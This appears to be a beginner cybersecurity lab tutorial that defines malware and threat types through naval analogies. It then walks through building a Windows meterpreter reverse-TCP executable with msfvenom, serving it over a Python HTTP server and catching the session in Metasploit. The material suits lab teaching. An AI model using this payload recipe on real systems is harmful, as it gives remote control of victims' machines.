blocks.content: Malware means any software created to damage, steal, or take control of a system. In naval style, malware is like placing a harmful device inside an enemy ship to disable important functions.

content: Malware can steal data
Malware can damage systems
Malware can take full control
Malware can spy on users

blocks.content: A threat is anything that can harm a system. It can be a hacker, malware, misconfiguration, or even weak passwords. In naval style, a threat is any danger approaching your ship — enemy submarines, hidden mines, or spying drones.

content: Cyber attackers
Malicious software
Weak security settings
Human mistakes
Virus – Spreads by attaching to files
Worm – Spreads across networks without help
Trojan – Looks safe but contains harmful code
Ransomware – Locks files until payment is made
Spyware – Steals private information
Adware – Shows unwanted ads and tracks behavior
Rootkit – Hides attacker activity inside the system
Keylogger – Records everything typed on the keyboard

blocks.content: We will create a Windows malware payload using Metasploit (MSFvenom). This payload will be used only inside the lab environment. In naval comparison, this is like crafting a controlled training torpedo to test ship defenses safely.

content: Command: msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o malware.exe
Why: It creates a Windows executable that connects back to our attack machine.
Command: msfconsole
Why: To start Metasploit Framework for handling the connection.
Command: use exploit/multi/handler
Why: To set up a listener that waits for the malware to connect back.
Command: set payload windows/meterpreter/reverse_tcp
Why: To match the payload created with MSFvenom.
Command: exploit
Why: Starts listening for the target system to run the malware.

blocks.content: In the lab, we have a Windows 7 machine configured. We will send the malware to the Windows machine and wait for it to execute. Once executed, a Meterpreter session will open. This is like planting a tracking device on an enemy ship and waiting for it to activate.

content: Use HTTP server: python3 -m http.server 80
Why: To easily share the malware file with the Windows machine.
Download malware from Windows: http://YOUR_IP/malware.exe
Why: To allow Windows 7 machine to download the payload.
Wait for connection: Meterpreter session will open in Metasploit
Why: Confirms successful system hacking inside the lab.
